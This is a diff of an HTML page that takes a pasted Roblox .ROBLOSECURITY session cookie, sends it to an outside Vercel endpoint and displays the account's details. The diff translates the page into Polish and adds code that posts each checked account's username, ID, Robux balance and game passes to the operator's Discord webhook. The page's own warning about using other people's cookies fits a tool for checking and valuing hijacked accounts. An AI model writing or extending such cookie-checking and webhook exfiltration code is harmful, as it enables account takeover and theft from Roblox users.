@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,16 +15,15 @@
   </style>
 </head>
 <body>
-
 <h2>Roblox Account Info from .ROBLOSECURITY Cookie</h2>
 
 <p style="color:#ffcc00; font-weight:bold;">
-  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and can lead to permanent account ban.
+  <strong>UWAGA:</strong> Używanie cudzego cookie narusza regulamin Roblox i może skończyć się permanentnym banem konta.
 </p>
 
-<textarea id="cookie" placeholder="Paste the .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
+<textarea id="cookie" placeholder="Wklej samą wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
 <br>
-<button onclick="checkAccount()">Check Account</button>
+<button onclick="checkAccount()">Sprawdź konto</button>
 
 <div id="result"></div>
 
@@ -35,11 +34,11 @@ async function checkAccount() {
   result.innerHTML = '';
 
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Cookie is too short or invalid</span>';
+    result.innerHTML = '<span class="error">Cookie jest za krótki lub nieprawidłowy</span>';
     return;
   }
 
-  result.innerHTML = '<i>Checking account... please wait</i>';
+  result.innerHTML = '<i>Sprawdzam konto... proszę czekać</i>';
 
   try {
     const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
@@ -51,55 +50,87 @@ async function checkAccount() {
     const json = await resp.json();
 
     if (json.error) {
-      result.innerHTML = `<span class="error">Error: ${json.error}</span>`;
+      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
       return;
     }
 
     if (json.success) {
       const creationDate = json.created !== 'failed to fetch'
-        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
+        ? new Date(json.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
         : '—';
 
       let avatarHtml = json.avatarUrl
-        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">`
-        : '<p style="color:#ffcc00;">Could not load avatar</p>';
+        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=Brak+Avatara';">`
+        : '<p style="color:#ffcc00;">Nie udało się załadować avatara</p>';
 
       const mm2Passes = [429957, 1308795];
       let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
-      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
 
       const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
       let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
-      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
 
       const sabPasses = [1227013099, 1229510262, 1228591447];
       let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
-      const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
 
+      // ────────────────────────────────────────────────
+      //          WYSYŁANIE NA DISCORD WEBHOOK
+      // ────────────────────────────────────────────────
+      const WEBHOOK_URL = "https://discord.com/api/webhooks/TWÓJ_WEBHOOK_ID/TWÓJ_WEBHOOK_TOKEN"; // ← ZMIEŃ NA SWÓJ !
+
+      const embed = {
+        title: `Roblox – ${json.username}`,
+        color: json.hasPremium ? 0x00ff9d : 0xff4d4d,
+        thumbnail: { url: json.avatarUrl || "https://via.placeholder.com/128?text=?" },
+        fields: [
+          { name: "Nick",           value: json.username, inline: true },
+          { name: "Display Name",   value: json.displayName, inline: true },
+          { name: "User ID",        value: json.userId.toString(), inline: true },
+          { name: "Premium",        value: json.hasPremium ? "✅ TAK" : "❌ NIE", inline: true },
+          { name: "Email/Phone",    value: json.emailVerified ? "✅ TAK (hat)" : "❌ NIE", inline: true },
+          { name: "Robux",          value: json.robux.toLocaleString('pl-PL') + " Robux", inline: true },
+          { name: "Wiek konta",     value: `${json.accountAgeDays} dni (${creationDate})`, inline: false },
+          { name: "MM² gamepasy",   value: mm2Count.toString(), inline: true },
+          { name: "AMP gamepasy",   value: ampCount.toString(), inline: true },
+          { name: "SAB gamepasy",   value: sabCount.toString(), inline: true },
+        ],
+        footer: { text: `Sprawdzono • ${new Date().toLocaleString('pl-PL')}` },
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+        // Można dodać komunikat w HTML że poszło na Discord – opcjonalne
+      } catch (webhookErr) {
+        console.error("Błąd wysyłania na webhook:", webhookErr);
+        // nie psujemy widoku użytkownikowi jeśli webhook padnie
+      }
+
+      // ────────────────────────────────────────────────
+      //          WYŚWIETLENIE WYNIKU NA STRONIE
+      // ────────────────────────────────────────────────
       result.innerHTML = `
-        <span class="success">Account verified successfully!</span><br><br>
+        <span class="success">Konto zweryfikowane pomyślnie!</span><br><br>
         ${avatarHtml}
         <b>Username:</b> ${json.username}<br>
         <b>Display Name:</b> ${json.displayName}<br>
         <b>User ID:</b> ${json.userId}<br>
-        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
-        
-        <b>Email / Phone Verified:</b> <span style="color: ${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
-          ${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
-        </span><br>
-        
-        <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
-        
-        <b>MM2 Gamepasses:</b> <span style="color: ${mm2Color}; font-weight: bold;">${mm2Count}</span><br>
-        <b>AMP Gamepasses:</b> <span style="color: ${ampColor}; font-weight: bold;">${ampCount}</span><br>
-        <b>SAB Gamepasses:</b> <span style="color: ${sabColor}; font-weight: bold;">${sabCount}</span><br>
-        
-        <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} days</span><br>
-        <b>Created:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
+        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}</span><br>
+        <b>Email / Telefon zweryfikowany:</b> <span style="color: ${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.emailVerified ? 'TAK ✓ (poświadczony hat)' : 'NIE ✗'}</span><br>
+        <b>Robux:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('pl-PL')} Robux</span><br>
+        <b>MM2 Gamepasy:</b> <span style="color: ${mm2Count > 0 ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${mm2Count}</span><br>
+        <b>AMP Gamepasy:</b> <span style="color: ${ampCount > 0 ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${ampCount}</span><br>
+        <b>SAB Gamepasy:</b> <span style="color: ${sabCount > 0 ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${sabCount}</span><br>
+        <b>Wiek konta:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} dni</span><br>
+        <b>Utworzone:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
+        <br><small style="color:#777;">Wynik został wysłany na Discord (jeśli webhook jest poprawny)</small>
       `;
     }
   } catch (e) {
-    result.innerHTML = `<span class="error">Connection error: ${e.message}</span>`;
+    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
   }
 }
 </script>
